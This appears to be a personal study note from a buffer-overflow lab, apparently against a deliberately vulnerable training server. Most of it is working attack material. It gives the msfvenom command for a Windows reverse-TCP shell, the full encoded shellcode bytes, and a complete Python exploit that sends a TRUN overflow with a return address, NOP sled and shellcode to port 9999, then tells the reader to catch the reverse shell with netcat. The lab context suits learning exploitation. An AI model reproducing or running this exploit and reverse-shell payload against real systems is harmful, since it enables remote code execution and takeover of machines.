Getting a Shell

    Using msfvenom 

        msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" 

            Switch of p for windows payload 

            Set lhost and lport  

            Exitfunc makes it more stable 

            Outputs to c  

            -b is the bad characters and we had nothing except the null byte here 

        Output 

        msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" 

        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 

        Found 11 compatible encoders 

        Attempting to encode payload with 1 iterations of x86/shikata_ga_nai 

        x86/shikata_ga_nai succeeded with size 351 (iteration=0) 

        x86/shikata_ga_nai chosen with final size 351 

        Payload size: 351 bytes 

        Final size of c file: 1500 bytes 

        unsigned char buf[] =  

        "\xdb\xc1\xbd\x5a\x54\xb2\x5f\xd9\x74\x24\xf4\x58\x31\xc9\xb1" 

        "\x52\x31\x68\x17\x03\x68\x17\x83\x9a\x50\x50\xaa\xe6\xb1\x16" 

        "\x55\x16\x42\x77\xdf\xf3\x73\xb7\xbb\x70\x23\x07\xcf\xd4\xc8" 

        "\xec\x9d\xcc\x5b\x80\x09\xe3\xec\x2f\x6c\xca\xed\x1c\x4c\x4d" 

        "\x6e\x5f\x81\xad\x4f\x90\xd4\xac\x88\xcd\x15\xfc\x41\x99\x88" 

        "\x10\xe5\xd7\x10\x9b\xb5\xf6\x10\x78\x0d\xf8\x31\x2f\x05\xa3" 

        "\x91\xce\xca\xdf\x9b\xc8\x0f\xe5\x52\x63\xfb\x91\x64\xa5\x35" 

        "\x59\xca\x88\xf9\xa8\x12\xcd\x3e\x53\x61\x27\x3d\xee\x72\xfc" 

        "\x3f\x34\xf6\xe6\x98\xbf\xa0\xc2\x19\x13\x36\x81\x16\xd8\x3c" 

        "\xcd\x3a\xdf\x91\x66\x46\x54\x14\xa8\xce\x2e\x33\x6c\x8a\xf5" 

        "\x5a\x35\x76\x5b\x62\x25\xd9\x04\xc6\x2e\xf4\x51\x7b\x6d\x91" 

        "\x96\xb6\x8d\x61\xb1\xc1\xfe\x53\x1e\x7a\x68\xd8\xd7\xa4\x6f" 

        "\x1f\xc2\x11\xff\xde\xed\x61\xd6\x24\xb9\x31\x40\x8c\xc2\xd9" 

        "\x90\x31\x17\x4d\xc0\x9d\xc8\x2e\xb0\x5d\xb9\xc6\xda\x51\xe6" 

        "\xf7\xe5\xbb\x8f\x92\x1c\x2c\xba\x62\x1c\xa8\xd2\x60\x20\xa1" 

        "\x7e\xec\xc6\xab\x6e\xb8\x51\x44\x16\xe1\x29\xf5\xd7\x3f\x54" 

        "\x35\x53\xcc\xa9\xf8\x94\xb9\xb9\x6d\x55\xf4\xe3\x38\x6a\x22" 

        "\x8b\xa7\xf9\xa9\x4b\xa1\xe1\x65\x1c\xe6\xd4\x7f\xc8\x1a\x4e" 

        "\xd6\xee\xe6\x16\x11\xaa\x3c\xeb\x9c\x33\xb0\x57\xbb\x23\x0c" 

        "\x57\x87\x17\xc0\x0e\x51\xc1\xa6\xf8\x13\xbb\x70\x56\xfa\x2b" 

        "\x04\x94\x3d\x2d\x09\xf1\xcb\xd1\xb8\xac\x8d\xee\x75\x39\x1a" 

        "\x97\x6b\xd9\xe5\x42\x28\xf9\x07\x46\x45\x92\x91\x03\xe4\xff" 

        "\x21\xfe\x2b\x06\xa2\x0a\xd4\xfd\xba\x7f\xd1\xba\x7c\x6c\xab" 

        "\xd3\xe8\x92\x18\xd3\x38"; 

         

    New script 

    #!/usr/bin/python 

    import sys, socket 

    from time import sleep 

      

    #625011af 

      

    overflow = ("\xdb\xc1\xbd\x5a\x54\xb2\x5f\xd9\x74\x24\xf4\x58\x31\xc9\xb1" 

    "\x52\x31\x68\x17\x03\x68\x17\x83\x9a\x50\x50\xaa\xe6\xb1\x16" 

    "\x55\x16\x42\x77\xdf\xf3\x73\xb7\xbb\x70\x23\x07\xcf\xd4\xc8" 

    "\xec\x9d\xcc\x5b\x80\x09\xe3\xec\x2f\x6c\xca\xed\x1c\x4c\x4d" 

    "\x6e\x5f\x81\xad\x4f\x90\xd4\xac\x88\xcd\x15\xfc\x41\x99\x88" 

    "\x10\xe5\xd7\x10\x9b\xb5\xf6\x10\x78\x0d\xf8\x31\x2f\x05\xa3" 

    "\x91\xce\xca\xdf\x9b\xc8\x0f\xe5\x52\x63\xfb\x91\x64\xa5\x35" 

    "\x59\xca\x88\xf9\xa8\x12\xcd\x3e\x53\x61\x27\x3d\xee\x72\xfc" 

    "\x3f\x34\xf6\xe6\x98\xbf\xa0\xc2\x19\x13\x36\x81\x16\xd8\x3c" 

    "\xcd\x3a\xdf\x91\x66\x46\x54\x14\xa8\xce\x2e\x33\x6c\x8a\xf5" 

    "\x5a\x35\x76\x5b\x62\x25\xd9\x04\xc6\x2e\xf4\x51\x7b\x6d\x91" 

    "\x96\xb6\x8d\x61\xb1\xc1\xfe\x53\x1e\x7a\x68\xd8\xd7\xa4\x6f" 

    "\x1f\xc2\x11\xff\xde\xed\x61\xd6\x24\xb9\x31\x40\x8c\xc2\xd9" 

    "\x90\x31\x17\x4d\xc0\x9d\xc8\x2e\xb0\x5d\xb9\xc6\xda\x51\xe6" 

    "\xf7\xe5\xbb\x8f\x92\x1c\x2c\xba\x62\x1c\xa8\xd2\x60\x20\xa1" 

    "\x7e\xec\xc6\xab\x6e\xb8\x51\x44\x16\xe1\x29\xf5\xd7\x3f\x54" 

    "\x35\x53\xcc\xa9\xf8\x94\xb9\xb9\x6d\x55\xf4\xe3\x38\x6a\x22" 

    "\x8b\xa7\xf9\xa9\x4b\xa1\xe1\x65\x1c\xe6\xd4\x7f\xc8\x1a\x4e" 

    "\xd6\xee\xe6\x16\x11\xaa\x3c\xeb\x9c\x33\xb0\x57\xbb\x23\x0c" 

    "\x57\x87\x17\xc0\x0e\x51\xc1\xa6\xf8\x13\xbb\x70\x56\xfa\x2b" 

    "\x04\x94\x3d\x2d\x09\xf1\xcb\xd1\xb8\xac\x8d\xee\x75\x39\x1a" 

    "\x97\x6b\xd9\xe5\x42\x28\xf9\x07\x46\x45\x92\x91\x03\xe4\xff" 

    "\x21\xfe\x2b\x06\xa2\x0a\xd4\xfd\xba\x7f\xd1\xba\x7c\x6c\xab" 

    "\xd3\xe8\x92\x18\xd3\x38") 

      

    shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow 

         The \x90 is some padding so nothing interferes with it  

      

    try: 

            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

            s.connect(('10.0.2.4',9999)) 

            s.send(('TRUN /.:/' + shellcode)) 

            s.close() 

      

    except: 

            print "Error connecting to server " 

            sys.exit() 

    Running a nc to listen on 4444 and running the above code will return a remote shell as a user  

     

     